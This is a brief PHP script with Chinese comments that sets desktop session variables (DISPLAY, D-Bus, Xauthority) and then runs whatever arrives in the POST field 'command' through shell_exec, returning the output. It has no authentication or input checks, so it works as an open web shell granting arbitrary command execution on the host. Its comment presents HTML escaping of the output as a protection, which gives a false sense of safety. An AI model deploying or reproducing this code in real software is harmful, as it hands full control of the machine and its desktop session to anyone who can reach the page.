<?php
 putenv('DISPLAY=:0');
 putenv('DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus');
 putenv('XDG_RUNTIME_DIR=/run/user/1000');
 putenv('XAUTHORITY=/run/user/1000/gdm/Xauthority');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];

    // 使用 shell_exec 执行命令并返回输出，包括错误输出
    $output = shell_exec($command . ' 2>&1');

    // 输出结果
    echo htmlspecialchars($output);  // 使用 htmlspecialchars 避免 HTML 注入
    exit;
}
?>
